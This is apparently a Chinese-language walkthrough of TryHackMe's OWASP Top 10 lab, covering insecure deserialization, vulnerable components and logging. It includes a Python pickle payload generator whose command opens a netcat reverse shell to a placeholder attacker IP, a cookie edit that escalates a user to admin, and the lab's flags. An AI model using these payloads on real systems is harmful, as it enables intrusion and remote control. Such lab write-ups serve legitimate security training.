+<p>具体而言，在不安全的反序列中，恶意代码实际上是利用了 Web 应用程序所使用的合法序列化、反序列化过程；我们稍后将解释这个合法过程以及为什么它在现代 Web 应用程序中如此普遍。</p>
+<p>OWASP 将此漏洞评为10位中的第8位(严重程度较低) ，原因如下：</p>
+<ul>
+<li><p>低可利用性。 此漏洞通常视具体情况而定——没有可靠的工具&#x2F;框架，由于该漏洞性质，攻击者需要很好地了解 ToE 的内部工作原理。</p>
+</li>
+<li><p>此类漏洞利用仅在攻击者的技能允许时才危险，通常需要关注的问题是：因为该漏洞而暴露的数据的价值。通过反序列化漏洞发起 DoS 攻击的攻击者会使目标应用程序不可用，而DoS攻击对基础设施的业务影响会有所不同——一些组织可能会恢复得很好，而其他组织则可能不会。</p>
+</li>
+</ul>
+<p><strong>什么目标是易受(反序列化漏洞)攻击的？</strong></p>
+<p>在没有对查询或保留的数据进行验证、完整性检查的情况下就存储或获取数据的任何应用程序，都将被视为易受反序列化漏洞影响；有关这种性质的应用程序的几个例子是：</p>
+<ul>
+<li>电子商务网站</li>
+<li>论坛</li>
+<li>API’s–应用程序编程接口</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1881588" >应用程序运行时 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>–Application Runtimes（Tomcat、Jenkins、Jboss 等）</li>
+</ul>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221205234852246.png"
+                      alt="image-20221205234852246"
+                ></p>
+<p>tips：DoS攻击–Denial of Service</p>
+<h2 id="严重程度TOP8-不安全的反序列化-对象"><a href="#严重程度TOP8-不安全的反序列化-对象" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-对象"></a>[严重程度TOP8] 不安全的反序列化-对象</h2><p>作为面向对象编程 (OOP：object-oriented programming) 的一个重要元素，对象主要由两部分组成：</p>
+<ul>
+<li>状态</li>
+<li>行为</li>
+</ul>
+<p>简单地说，对象允许你创建相似的代码行，而无需再次编写相同的代码行。</p>
+<p>例如，一盏灯将是一个很好的对象，灯可以有 不同类型的灯泡 ，这是它的状态，而灯的 开&#x2F;关 则是它的行为！你不必考虑每种类型的灯泡以及该特定灯是否打开或关闭，因为你可以使用方法(methods)来简单地改变灯的状态和行为。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221206235215817.png"
+                      alt="image-20221206235215817"
+                ></p>
+<h2 id="严重程度TOP8-不安全的反序列化-反序列化"><a href="#严重程度TOP8-不安全的反序列化-反序列化" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-反序列化"></a>[严重程度TOP8] 不安全的反序列化-反序列化</h2><p><strong>序列化和反序列化</strong></p>
+<p>通过类比来学习：一位外国游客在街上向你走来并问路，他正在寻找当地的地标，但他迷路了，不幸的是，中文不是他的强项，而你也不会说他的语言。你会怎么做呢？你可以画一张通往地标的路线图，因为图片跨越了语言障碍，这能够让他成功找到地标。 好的！你刚刚其实就是对一些信息进行了序列化，然后这位迷路的游客则对已被处理的信息进行了反序列化 从而最终找到地标。</p>
+<p>简而言之：序列化是将编程中使用的对象转换为更简单、兼容的格式，以便在系统或网络之间传输以进行进一步处理或存储的过程；而反序列化则相反，反序列化能够将序列化信息转换成它们原本的复杂形式——重新变为一个应用程序可以理解的对象。</p>
+<p><em><strong>例：</strong></em></p>
+<p>假设有一个密码字符串“password123”，它来自一个程序，现在我们需要将该密码字符串存储到另一个系统上的数据库中；这是一个在网络中传输数据的过程，因而我们需要将此字符串&#x2F;输出转换为二进制形式（这是一个序列化过程）以便在网络中进行数据传输。</p>
+<p>当然，这个密码最终还是要在目标系统中被存储为“password123”字符串形式而不是其二进制形式；所以，一旦需要被存储的数据到达了目标系统的数据库中，它就需要被转换或反序列化回“password123”字符串（这是一个反序列化过程），以便目标数据库进行存储。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207080331427.png"
+                      alt="image-20221207080331427"
+                ></p>
+<p><strong>如何利用序列化和反序列化？</strong></p>
+<p>简而言之，当来自不受信任方（即攻击方）的数据没有经过过滤处理或输入验证处理而 被系统执行时，就可能会发生不安全的反序列化；在这种情况下：系统会假定用户所输入的数据是可信的，并且会毫无保留地执行相关的数据内容，从而导致一系列安全风险的产生。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207081346257.png"
+                      alt="image-20221207081346257"
+                ></p>
+<h2 id="严重程度TOP8-不安全的反序列化-Cookies"><a href="#严重程度TOP8-不安全的反序列化-Cookies" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-Cookies"></a>[严重程度TOP8] 不安全的反序列化-Cookies</h2><p><strong>Cookies 简介</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207081523717.png"
+                      alt="image-20221207081523717"
+                ></p>
+<p>Cookies 是现代网站运行的重要工具之一，是由网站创建并存储在用户的计算机上的微小的数据段。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207081911048.png"
+                      alt="image-20221207081911048"
+                ></p>
+<p>你会在大多数网站上看到类似上图的通知信息，网站将使用 cookies 来存储特定于用户的行为，例如用户购物车中的商品或会话 ID；在 Web 应用程序中，我们将利用它，你会注意到 cookie 将存储如下登录信息。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207083619301.png"
+                      alt="image-20221207083619301"
+                ></p>
+<p>虽然使用明文凭据本身就是一种漏洞，但它并不属于不安全的反序列化，因为在使用明文凭据时，我们并未发送任何要执行的序列化数据！</p>
+<p>Cookie 不是一个像数据库那样的永久存储解决方案，一些 cookie（例如会话 ID）会在浏览器关闭时被清除，而其他 cookie 则可能会持续相当长的时间；cookie的具体有效时间是由创建 cookie 时所设置的“到期(Expiry)”计时器来决定的。</p>
+<p>一些 cookie 有额外的属性，下面是相关的介绍：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207084956109.png"
+                      alt="image-20221207084956109"
+                ></p>
+<p><strong>创建 Cookie</strong></p>
+<p>可以使用各种网站编程语言设置 Cookie，例如Javascript、PHP 或 Python 等等；下面的Web应用是使用Python的Flask开发的，拿它来举例比较合适。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207090734279.png"
+                      alt="image-20221207090734279"
+                ></p>
+<p>在 Flask 中设置 cookie 相当简单，上图中的代码片段会获取当前日期和时间，并将其存储在变量“timestamp”中，然后将日期和时间存储在名为“registrationTimestamp”的 cookie 中，它在浏览器中的样子为：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207093801602.png"
+                      alt="image-20221207093801602"
+                ></p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207093837451.png"
+                      alt="image-20221207093837451"
+                ></p>
+<h2 id="严重程度TOP8-不安全的反序列化-基于Cookies的练习"><a href="#严重程度TOP8-不安全的反序列化-基于Cookies的练习" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-基于Cookies的练习"></a>[严重程度TOP8] 不安全的反序列化-基于Cookies的练习</h2><p><strong>访问练习实例</strong></p>
+<p>使用已经连接到TryHackMe VPN 的攻击机，通过浏览器导航到 <a class="link"   target="_blank" rel="noopener" href="http://machine_ip/" >http://MACHINE_IP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，此处将详细介绍使用Firefox浏览器的练习步骤–你可能需要研究如何在其他浏览器中检查 cookie。 访问目标站点之后，你将看到如下主页界面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207094203679.png"
+                      alt="image-20221207094203679"
+                ></p>
+<p>让我们创建一个帐户，你可以输入你所喜欢的任何内容。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207094233129.png"
+                      alt="image-20221207094233129"
+                ></p>
+<p>完成登录行为之后，你将被重定向到个人资料页面，在此页面右侧，你可以看到你的个人详细信息。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207094417615.png"
+                      alt="image-20221207094417615"
+                ></p>
+<p>右键单击以上页面，然后选择“检查元素-Inspect Element”，导航到“存储-Storage”选项卡。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207094605184.png"
+                      alt="image-20221207094605184"
+                ></p>
+<p><strong>检查已编码的数据</strong></p>
+<p>你会发现，这些 cookie 既有明文显示的，也有经过 base64 编码的，第一个flag将在其中一个 cookie 中找到。</p>
+<p><strong>修改 Cookie 值</strong></p>
+<p>请注意，你现在有一个名为“userType”的 cookie，正如你在“myprofile-我的个人资料”页面上的信息所确认的那样，你目前的身份是一名普通用户-user。</p>
+<p>此web应用程序会根据你的账户类型来确定你可以看到和不能看到的内容，如果你现在想成为管理员身份该怎么办？你可以尝试修改cookie值！</p>
+<p>左键双击“userType”的“Value”栏，修改内容，让我们将userType的Value更改为“admin”然后导航到 <a class="link"   target="_blank" rel="noopener" href="http://machine_ip/admin" >http://MACHINE_IP/admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以获得第二个flag。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207095944461.png"
+                      alt="image-20221207095944461"
+                ></p>
+<p>启动目标机器，在攻击机的浏览器中访问目标站点并注册账户以完成登录操作：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207151136620.png"
+                      alt="image-20221207151136620"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207151215577.png"
+                      alt="image-20221207151215577"
+                ></p>
+<p>成功登录后，将进入到个人资料界面，右键单击此页面，选择“检查元素-Inspect Element”并导航到“存储-Storage”选项卡，获得第一个flag：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207151232692.png"
+                      alt="image-20221207151232692"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207151446303.png"
+                      alt="image-20221207151446303"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207151648417.png"
+                      alt="image-20221207151648417"
+                ></p>
+<blockquote>
+<p>base64解码网站：<a class="link"   target="_blank" rel="noopener" href="https://www.base64decode.org/" >https://www.base64decode.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>flag：THM{good_old_base64_huh}</p>
+</blockquote>
+<p>左键双击“userType”的“Value”栏，将Value更改为“admin”然后导航到 <a class="link"   target="_blank" rel="noopener" href="http://machine_ip/admin" >http://MACHINE_IP/admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 并获得第二个flag：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207151730728.png"
+                      alt="image-20221207151730728"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207151819237.png"
+                      alt="image-20221207151819237"
+                ></p>
+<blockquote>
+<p>THM{heres_the_admin_flag} </p>
+</blockquote>
+<h2 id="严重程度TOP8-不安全的反序列化-代码执行"><a href="#严重程度TOP8-不安全的反序列化-代码执行" class="headerlink" title="[严重程度TOP8] 不安全的反序列化-代码执行"></a>[严重程度TOP8] 不安全的反序列化-代码执行</h2><p>这是一种比简单地解码 cookie 更加邪恶的攻击，我们将深入了解它的本质。</p>
+<p><strong>继续使用上节中的示例进行设置</strong></p>
+<p>1、先将cookie中的userType的值从“admin”重新改为“user”，返回<a class="link"   target="_blank" rel="noopener" href="http://machine_ip/myprofile" >http://MACHINE_IP/myprofile <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 页面。</p>
+<p>2.然后，左键单击下面截图中“Exhange your vim”上的 URL链接。（此处的vim指：Vertical Improved Mail–垂直改进邮件）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207152555143.png"
+                      alt="image-20221207152555143"
+                ></p>
+<p>3.完成上述操作后，左键单击上图中的“Provide your feedback!–提供您的反馈！”上的 URL链接，你将直接转到下图的页面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207152722157.png"
+                      alt="image-20221207152722157"
+                ></p>
+<p><strong>怎样利用以上设置？</strong></p>
+<p>如果用户在表单中输入了他们的反馈信息，则相关数据可能会经过编码处理并发送到 Flask 应用程序（这些数据可能会被存储到数据库中）；但是，发生以上过程的前提条件是：目标应用程序会假定任何已编码的数据都是可信的（此条件在现实环境下可能并不能满足）。</p>
+<p>了解下面代码片段中发生的事情很重要：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207153718508.png"
+                      alt="image-20221207153718508"
+                ></p>
+<p>当你访问“Exchange your vim”URL链接时，一个 cookie 将被编码处理并存储在你的浏览器中 - 我们可以尝试修改！而一旦你访问反馈表单，前述经过编码处理的 cookie 值就会被解码并执行反序列化过程。 在下面的代码片段中，我们可以看到cookie是如何被检索的，并最终通过 <code>pickle.loads</code> 完成反序列化过程。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207154218107.png"
+                      alt="image-20221207154218107"
+                ></p>
+<p>此漏洞利用了Python中的<code>Pickle</code>，我们可以借此机制尝试建立一个反向 shell。</p>
+<p><strong>漏洞利用</strong></p>
+<p>1.首先，我们需要在攻击机上设置一个 netcat 监听器。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207154725552.png"
+                      alt="image-20221207154725552"
+                ></p>
+<p>因为被反序列化的代码来自于 base64 格式的cookie内容，所以我们不能简单地生成一个反向 shell，我们必须使用 base64 对我们需要执行的命令进行编码处理，以便最终能够执行恶意代码。</p>
+<p>2.完成监听器的设置后，将 python 文件 (<a class="link"   target="_blank" rel="noopener" href="https://assets.tryhackme.com/additional/cmn-owasptopten/pickleme.py" >pickelme.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>) 中的源代码复制并粘贴到你的攻击机上，修改源代码将“YOUR_TRYHACKME_VPN_IP”替换为你的攻击机所使用的 TryHackMe VPN IP。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207155331116.png"
+                      alt="image-20221207155331116"
+                ></p>
+<p>3.通过 python3执行“ pickelme.py”并查看命令的输出结果（下图命令中的rce.py即是修改内容之后的pickelme.py）：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207155919908.png"
+                      alt="image-20221207155919908"
+                ></p>
+<p>4.复制并粘贴以上输出结果中的 两个单引号标记（’DATA’）之间的所有内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207160302850.png"
+                      alt="image-20221207160302850"
+                ></p>
+<p>5.将其粘贴到浏览器中的“encodedPayload”cookie值中：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207160531109.png"
+                      alt="image-20221207160531109"
+                ></p>
+<p>6.确保我们的攻击机上的 netcat 侦听器仍在运行：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207160616402.png"
+                      alt="image-20221207160616402"
+                ></p>
+<p>7.在个人资料页面 点击提交反馈对应的URL链接(这将触发对cookie值进行反序列化的过程)，在攻击机上将接收到一个反向shell，我们可以通过这个shell界面查看flag.txt文件内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207160723115.png"
+                      alt="image-20221207160723115"
+                ></p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207160901060.png"
+                      alt="image-20221207160901060"
+                ></p>
+<p>实际操作步骤和本节内容所介绍的基本一致：</p>
+<p>修改userType值为user</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207161146842.png"
+                      alt="image-20221207161146842"
+                ></p>
+<p>回到个人资料页面 <a class="link"   target="_blank" rel="noopener" href="http://machine_ip/myprofile" >http://MACHINE_IP/myprofile <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，点击<em>Exchange your vim</em>链接（此处的vim指：Vertical Improved Mail–垂直改进邮件）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207161312676.png"
+                      alt="image-20221207161312676"
+                ></p>
+<p>点击链接之后，我们可以看到cookie发生了变化</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207162549336.png"
+                      alt="image-20221207162549336"
+                ></p>
+<p>现在可以开始反序列化漏洞利用过程：主要操作是构建一段经过base64编码处理的恶意代码，用恶意代码替换上图中的指定cookie值–即encodedPayload的值；我们使用以下py脚本来生成一段可以用于建立反向shell的base64格式的payload：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">command = <span class="string">&#x27;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | netcat YOUR_TRYHACKME_VPN_IP 4444 &gt; /tmp/f&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">rce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure></div>
+
+<p>修改ip地址为攻击机ip地址(此处ip地址为tun0网卡对应地址)</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207163535284.png"
+                      alt="image-20221207163535284"
+                ></p>
+<p>在攻击机上设置Netcat监听器：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207164140555.png"
+                      alt="image-20221207164140555"
+                ></p>
+<p>执行脚本，获得payload(取单引号中的内容作为payload)并填充至指定的cookie值中–即encodedPayload的对应值：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207163952013.png"
+                      alt="image-20221207163952013"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207164207319.png"
+                      alt="image-20221207164207319"
+                ></p>
+<p>在个人资料页面 点击提交反馈对应的URL链接，这将触发对之前所修改的指定cookie值的反序列化过程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207164305760.png"
+                      alt="image-20221207164305760"
+                ></p>
+<p>回到攻击机终端界面，获得一个反向shell，使用该shell界面查找flag.txt文件，并查看其内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207164914268.png"
+                      alt="image-20221207164914268"
+                ></p>
+<blockquote>
+<p>4a69a7ff9fd68</p>
+</blockquote>
+<h2 id="严重程度TOP9-具有已知漏洞的组件-简介"><a href="#严重程度TOP9-具有已知漏洞的组件-简介" class="headerlink" title="[严重程度TOP9] 具有已知漏洞的组件-简介"></a>[严重程度TOP9] 具有已知漏洞的组件-简介</h2><p>有时，你可能会发现你正在进行渗透测试的公司所使用的应用程序本身就存在有充分记录的已知漏洞。</p>
+<p>例如，假设现在有一家公司已经有几年没有更新他们的 WordPress 版本，通过使用诸如 wpscan 之类的工具进行扫描，你发现了它是 4.6 版本的WordPress，经过调查你会发现 WordPress 4.6 版本容易受到未经身份验证的远程代码执行 (RCE) 攻击，也许你还可以在漏洞利用数据库<strong>exploit-db</strong>中找到<a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41962" >相关的漏洞exp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
+<p>正如你所看到的，这将是一件非常具有破坏性的事情，在这种情况下攻击者只需要做很少的工作就能完成攻击，因为目标应用程序的相关漏洞可能已经众所周知，其他攻击者也已经利用过了相关漏洞，所以，如果一家公司错过了他们所使用的应用程序的一次版本更新或者补丁更新，那么他们就可能遭受一些来自不法份子的网络攻击。</p>
+<p>OWASP组织将 具有已知漏洞的组件 评级为流行等级3（意思是有较高的流行度），因为在现实情况下，目标公司往往很容易错过对目标应用程序的及时更新。</p>
+<h2 id="严重程度TOP9-具有已知漏洞的组件-漏洞利用"><a href="#严重程度TOP9-具有已知漏洞的组件-漏洞利用" class="headerlink" title="[严重程度TOP9] 具有已知漏洞的组件-漏洞利用"></a>[严重程度TOP9] 具有已知漏洞的组件-漏洞利用</h2><p>因为目标应用程序存在已知漏洞的组件，所以大部分攻击工作已经为我们完成了。我们的主要工作是找出目标软件的信息，并对其进行研究，直到找到相关的已知漏洞详情。</p>
+<p>接下来，让我们通过一个Web 应用程序示例来了解一下。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207171014001.png"
+                      alt="image-20221207171014001"
+                ></p>
+<p>假设目标正在使用web服务器-nostromo 的默认页面，那么现在我们知道了目标应用程序的版本号和相关的软件名称，我们可以使用 <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/" >exploit-db <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 来尝试找到这个特定版本的nostromo 漏洞。（注意：exploit-db 非常有用，对于网络安全初学者来说，你可能会经常使用它，所以最好熟悉它）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207171639350.png"
+                      alt="image-20221207171639350"
+                ></p>
+<p>如上图所示，我们找到了一个相关的漏洞利用脚本，让我们下载它并尝试执行代码，然而单独运行这个脚本的结果并未如我们所愿，它会给出如下图所示的报错信息。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207171908610.png"
+                      alt="image-20221207171908610"
+                ></p>
+<p>有时候，第一次执行exp可能并不会起作用，所以了解脚本相关的编程语言会对我们进行漏洞利用有所帮助，如果需要的话，你可以尝试修复任何exp执行错误或者进行任何exp内容的修改工作，因为 exploit-db 上的很多脚本都需要经过修改才能被成功执行。</p>
+<p>幸运的是，在本例中的exp相关错误是由本应被注释的行所引起的，因此我们很容易修复该exp–我们将以下代码行注释即可：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207172421592.png"
+                      alt="image-20221207172421592"
+                ></p>
+<p>解决以上问题之后，让我们再次尝试运行exp。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207172547885.png"
+                      alt="image-20221207172547885"
+                ></p>
+<p>我们成功执行了RCE，需要注意的是，大多数exp脚本只会告诉我们需要给它提供哪些参数以便完成漏洞利用过程，exp开发人员很少会让你 为了弄清楚如何使用exp脚本而去阅读数百行代码。</p>
+<p>有时你会很容易得到应用程序的版本号，但其他时候你可能还需要挖掘 HTML 源代码，或者需要猜测一个能够被成功使用的漏洞利用脚本；如果目标应用程序的相关漏洞是一个已知漏洞，则总有办法可以尝试发现目标应用程序所运行的版本信息。</p>
+<h2 id="严重程度TOP9-具有已知漏洞的组件-实验"><a href="#严重程度TOP9-具有已知漏洞的组件-实验" class="headerlink" title="[严重程度TOP9] 具有已知漏洞的组件-实验"></a>[严重程度TOP9] 具有已知漏洞的组件-实验</h2><p>实验：现在有一个易受攻击的应用程序，我们已知该目标具有已知漏洞的组件，我们需要通过公开的信息完成整个漏洞利用过程。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207173910294.png"
+                      alt="image-20221207173910294"
+                ></p>
+<p>启动目标机器，用攻击机访问目标站点：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207183040245.png"
+                      alt="image-20221207183040245"
+                ></p>
+<p>在 <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/" >https://www.exploit-db.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 搜索目标应用程序，点击下载即可：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207183407087.png"
+                      alt="image-20221207183407087"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207183637612.png"
+                      alt="image-20221207183637612"
+                ></p>
+<p>在攻击机上使用exp，指定目标url参数：</p>
+<blockquote>
+<p>python 47887.py <a class="link"   target="_blank" rel="noopener" href="http://10.10.52.29/" >http://10.10.52.29/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207184053851.png"
+                      alt="image-20221207184053851"
+                ></p>
+<blockquote>
+<p>1611</p>
+</blockquote>
+<h2 id="严重程度TOP10-日志记录和监控不足"><a href="#严重程度TOP10-日志记录和监控不足" class="headerlink" title="[严重程度TOP10] 日志记录和监控不足"></a>[严重程度TOP10] 日志记录和监控不足</h2><p>在设置 Web 应用程序时，应该记录用户执行的每个操作，这些日志记录很重要，因为在发生安全事件时，日志可以用于跟踪攻击者的行为；一旦追踪到攻击者的行为，就可以确定他们所进行的行为的安全风险和安全影响。 如果没有日志记录，就无法判断攻击者在获得对特定 Web 应用程序的访问权限之后 具体执行了哪些操作，其中更大的影响包括：</p>
+<ul>
+<li>监管损失：如果攻击者获得了对用户个人身份信息的访问权限并且没有留下日志记录，不仅应用程序的用户本身会受到安全影响，该应用程序的所有者也可能会按照当地法律法规受到罚款或其他更严厉的处罚。</li>
+<li>进一步攻击的风险：如果目标应用程序不进行日志记录，则可能无法检测到攻击者的存在，这可能会允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步的攻击。</li>
+</ul>
+<p>日志中存储的信息应包括：</p>
+<ul>
+<li>HTTP status codes（HTTP状态码）</li>
+<li>Time Stamps（时间戳）</li>
+<li>Usernames（用户名）</li>
+<li>API endpoints&#x2F;page locations（API 端点&#x2F;页面 位置）</li>
+<li>IP addresses（IP地址）</li>
+</ul>
+<p>这些日志确实包含一些敏感信息，因此确保安全存储日志并将这些日志的多个副本存储在不同位置非常重要。</p>
+<p>你可能已经注意到，在发生网络安全违规或事件后，日志记录显得尤为重要。理想的情况是 目标应用程序能够进行行为监控以检测任何可疑活动，而检测这种可疑活动的目的要么是为了完全阻止攻击者，要么是当检测到攻击者的时间比预期晚得多时（如：在攻击者入侵十天之后才检测到）尽可能地减少攻击者所造成的影响。可疑活动的常见示例包括：</p>
+<ul>
+<li><p>多次未经授权的特定操作尝试：通常是身份验证尝试或者访问未经授权的资源–例如管理员页面。</p>
+</li>
+<li><p>来自异常 IP 地址或位置的请求：这可能表明其他人正在尝试访问特定用户的帐户，注意：具有一定误报率。</p>
+</li>
+<li><p>使用自动化工具：特定的自动化工具可以很容易地被目标应用程序所识别，例如，检测用户所使用的 User-Agent 标头的值或用户发出请求的速度，这些特征可能表明攻击者正在使用自动化工具。</p>
+</li>
+<li><p>常见有效载荷（Payload）：在 Web 应用程序中，攻击者可能会使用跨站点脚本 (XSS)等一系列有效载荷，通过检测这些有效载荷的使用情况 就可以得知是否有人在对目标应用程序进行未经授权&#x2F;恶意测试。</p>
+</li>
+</ul>
+<p>仅仅检测可疑活动还不够，还需要根据影响级别对这种可疑活动进行评级；某些攻击行为会比其他攻击行为产生更大的影响，这些影响较大的行动需要优先做应急响应处理，因此应该针对性地发出告警，以引起相关管理方的注意。</p>
+<p>接下来，我们需要通过分析示例日志文件来实践本节相关知识点。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207192855705.png"
+                      alt="image-20221207192855705"
+                ></p>
+<p>下载本小节对应的附件，打开示例日志文件并查看其内容：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207192913323.png"
+                      alt="image-20221207192913323"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221207192955916.png"
+                      alt="image-20221207192955916"
+                ></p>
